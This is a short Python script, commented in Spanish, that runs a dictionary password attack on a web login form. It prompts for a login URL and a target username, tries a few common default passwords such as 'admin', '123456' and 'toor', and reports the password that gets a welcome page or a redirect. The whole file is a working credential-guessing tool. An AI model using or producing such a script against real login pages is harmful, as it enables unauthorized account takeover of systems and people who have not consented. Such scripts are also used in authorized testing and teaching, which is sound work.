import requests

url_login = input("URL del login (ej: http://192.168.1.10:8080/login): ")
usuario = input("Usuario objetivo: ")
diccionario = ["admin", "123456", "toor", "admin123", "password"]

for clave in diccionario:
    datos = {"username": usuario, "password": clave}
    response = requests.post(url_login, data=datos)
    
    if "Welcome" in response.text or response.status_code == 302:
        print(f"Clave encontrada: {clave}")
        break
    else:
        print(f"Falló con clave: {clave}")
